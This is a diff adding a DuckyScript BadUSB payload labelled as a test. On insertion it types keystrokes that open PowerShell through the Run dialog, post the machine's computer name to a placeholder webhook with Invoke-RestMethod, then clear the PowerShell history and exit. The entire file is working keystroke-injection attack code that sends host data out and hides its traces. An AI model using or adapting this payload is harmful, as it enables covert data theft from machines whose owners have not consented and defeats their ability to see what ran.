@@ -1,0 +1,38 @@
+REM Title      : test
+REM Description: Badusb test.
+REM Author     : dagnazty
+REM Version    : 1.0.0
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell
+DELAY 2000
+ENTER
+DELAY 5000
+STRING $webhookUrl1 = "webhook"
+DELAY 200
+ENTER
+STRING $data1 = @{
+ENTER
+STRING "username" = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes("$env:ComputerName"))
+ENTER
+STRING "avatar_url" = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes("https://i.imgur.com/3aaoxTE.gif"))
+ENTER
+STRING "content" = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes(""))
+ENTER
+STRING "embeds" = @(@{"color" = 8736744; "image" = @{ "url" = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes("https://i.imgur.com/CEfWhL4.gif")) }; "footer" = @{
+ENTER
+STRING "text" = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes("Successful!"))
+ENTER
+STRING }})
+ENTER
+STRING }
+ENTER
+STRING $response1 = Invoke-RestMethod -Uri $webhookUrl1 -Method Post -Body ($data1 | ConvertTo-Json -Depth 4) -ContentType 'application/json'
+ENTER
+STRING Write-Host "Webhook successfully posted to $webhookUrl1"
+ENTER
+STRING Clear-History
+ENTER
+STRING exit
+ENTER
